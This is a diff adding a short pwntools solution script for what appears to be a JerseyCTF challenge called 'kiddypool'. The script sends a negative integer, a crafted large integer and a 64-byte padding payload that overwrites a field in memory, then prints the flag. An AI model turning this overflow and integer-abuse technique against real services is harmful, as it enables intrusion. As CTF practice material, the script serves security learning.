@@ -1,0 +1,16 @@
+from pwn import *
+
+conn = remote('kiddypool.aws.jerseyctf.com', 9001)
+
+conn.sendlineafter(b'How old are you', b'-1')
+conn.sendlineafter(b'dive into the water', b'4607182418800017408')
+conn.sendlineafter(b'Swim through the hoop!', b'64')
+
+# Overwrite hoop field (64 bytes padding + 4 bytes value)
+payload = b'A' * 64 + b'\xe1\xeb\xe8\xec'
+conn.sendlineafter(b'Now make your own course', payload)
+
+conn.sendlineafter(b'medal?', b'netrunner')
+
+# Print the final output — flag should be here!
+print(conn.recvall().decode())
